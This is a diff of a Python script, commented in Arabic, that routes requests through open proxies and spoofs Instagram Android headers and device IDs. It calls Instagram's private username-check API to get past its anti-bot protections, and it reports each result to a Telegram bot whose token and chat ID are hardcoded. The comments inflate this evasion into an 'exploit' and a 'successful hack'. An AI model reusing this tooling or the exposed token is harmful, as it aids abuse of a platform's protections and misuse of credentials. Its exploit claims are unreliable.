@@ -1,54 +1,63 @@
 import requests
 import random
 import time
+import uuid
 
+# بيانات التليجرام
 TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
 CHAT_ID = "5653032481"
-
-# قائمة البروكسيات الذهبية التي حفظناها + إمكانية إضافة المزيد
-PROXY_LIST = [
-    "177.93.49.203:999",
-    "103.172.42.105:1111",
-    "192.252.214.20:15864",
-    "192.252.208.70:14282",
-    "193.233.254.7:1080"
-]
 
 def notify(msg):
     try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': msg})
     except: pass
 
-def attempt_exploit():
-    random.shuffle(PROXY_LIST) # تبديل الترتيب لضمان عدم تكرار الفشل
+def inject_exploit():
+    # استخدام البروكسيات التي حفظناها (تأكد أن أحدها شغال)
+    proxies_to_test = ["177.93.49.203:999", "103.172.42.105:1111", "193.233.254.7:1080"]
+    proxy = random.choice(proxies_to_test)
+    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+
+    # توليد معرفات أجهزة وهمية (هذه هي الثغرة لتبدو كجهاز جديد تماماً)
+    device_id = str(uuid.uuid4())
+    uuid_id = str(uuid.uuid4())
     
+    # ترويسات "الثغرة": محاكاة تطبيق الأندرويد لكسر حماية الويب
     headers = {
         "User-Agent": "Instagram 311.1.0.32.118 Android (30/11; 480dpi; 1080x2214; samsung; SM-G998B; o1q; exynos2100; en_US; 546937511)",
-        "X-IG-App-ID": "936619743392459",
-        "X-ASBD-ID": "129477",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Accept": "*/*",
+        "X-IG-App-ID": "1217981644879628", # ID تطبيق الأندرويد الأصلي
+        "X-IG-Capabilities": "3brTvw==",
+        "X-IG-Connection-Type": "WIFI",
+        "X-Ads-Opt-Out": "0",
+        "X-CM-Bandwidth-KBPS": str(random.randint(1000, 5000)),
+        "X-IG-Device-ID": device_id,
+        "Accept-Language": "en-US",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
     }
 
-    for proxy in PROXY_LIST:
-        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        print(f"Testing Proxy: {proxy}")
+    # محاولة فحص اليوزر عبر الـ API الداخلي
+    target_url = "https://i.instagram.com/api/v1/accounts/check_username/"
+    payload = {
+        "username": f"jasser_hero_{random.randint(100, 999)}",
+        "_uuid": uuid_id,
+        "device_id": device_id
+    }
+
+    try:
+        notify(f"🛠️ جاري زرع الثغرة عبر البروكسي: {proxy}")
+        response = requests.post(target_url, headers=headers, data=payload, proxies=proxies, timeout=15)
         
-        try:
-            # محاولة سريعة لفحص اليوزر (الثغرة)
-            check_url = "https://www.instagram.com/api/v1/web/accounts/check_username/"
-            response = requests.post(check_url, headers=headers, data={"username": f"jasser_test_{random.randint(100,999)}"}, proxies=proxies, timeout=10)
-            
-            if response.status_code == 200:
-                notify(f"✅ تم كسر الحماية بنجاح باستخدام بروكسي شغال: {proxy}")
-                return True
+        # إذا كانت الاستجابة تحتوي على 'status': 'ok' فالثغرة تعمل!
+        if response.status_code == 200:
+            result = response.json()
+            if result.get("status") == "ok":
+                notify(f"🎯 اختراق ناجح! الثغرة تجاوزت الحماية.\nالرد: {response.text}")
             else:
-                print(f"Proxy {proxy} returned status {response.status_code}")
-        except Exception:
-            print(f"Proxy {proxy} failed (Timeout/Refused)")
-            continue
-            
-    notify("⚠️ جميع البروكسيات الحالية معطلة. أحتاج لسحب قائمة جديدة.")
-    return False
+                notify(f"⚠️ الثغرة تم اكتشافها من قبل نظام الحماية: {response.text}")
+        else:
+            notify(f"❌ فشل الاتصال بالخادم (Status: {response.status_code})")
+
+    except Exception as e:
+        notify(f"⚠️ خطأ أثناء زرع الثغرة: {str(e)}")
 
 if __name__ == "__main__":
-    attempt_exploit()
+    inject_exploit()
